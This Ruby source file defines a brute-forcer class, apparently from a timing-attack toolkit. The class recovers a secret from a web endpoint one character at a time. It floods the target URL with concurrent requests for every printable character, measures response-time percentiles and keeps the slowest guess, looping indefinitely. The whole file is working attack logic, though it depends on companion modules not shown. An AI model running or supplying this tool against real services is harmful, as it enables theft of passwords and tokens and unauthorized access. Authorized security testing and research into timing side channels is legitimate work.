module TimingAttack
  class BruteForcer
    include TimingAttack::Attacker

    def initialize(options: {})
      @options = DEFAULT_OPTIONS.merge(options)
      raise ArgumentError.new("Must provide :url key") if url.nil?
      @concurrency = options.fetch(:concurrency, 3)
      @iterations = options.fetch(:iterations, 20)
      @known = ""
    end

    private

    attr_reader :known
    POTENTIAL_BYTES = (' '..'z').to_a
    def attack!
      while(true)
        attack_byte!
      end
    end

    def attack_byte!
      @attacks = POTENTIAL_BYTES.map do |byte|
        TimingAttack::TestCase.new(input: "#{known}#{byte}",
                                   options: options)
      end
      run_attacks_for_single_byte!
      process_attacks_for_single_byte!
    end

    def run_attacks_for_single_byte!
      hydra = Typhoeus::Hydra.new(max_concurrency: concurrency)
      iterations.times do
        attacks.each do |attack|
          req = attack.generate_hydra_request!
          req.on_complete do |response|
            print "\r#{' ' * (known.length + 4)}"
            output.increment
            print " '#{known}'"
          end
          hydra.queue req
        end
      end
      hydra.run
    end

    def process_attacks_for_single_byte!
      attacks.each(&:process!)
      grouper = Grouper.new(attacks: attacks, group_by: { percentile: options.fetch(:percentile) })
      results = grouper.long_tests.map(&:input)
      if grouper.long_tests.count > 1
        raise StandardError.new("Got too many possibilities: #{results.join(', ')}")
      end
      @known = results.first
    end

    def output
      @output ||= TimingAttack::Spinner.new
    end

    DEFAULT_OPTIONS = {
      verbose: true,
      method: :get,
      iterations: 50,
      mean: false,
      percentile: 3,
      concurrency: 15,
    }.freeze
  end
end
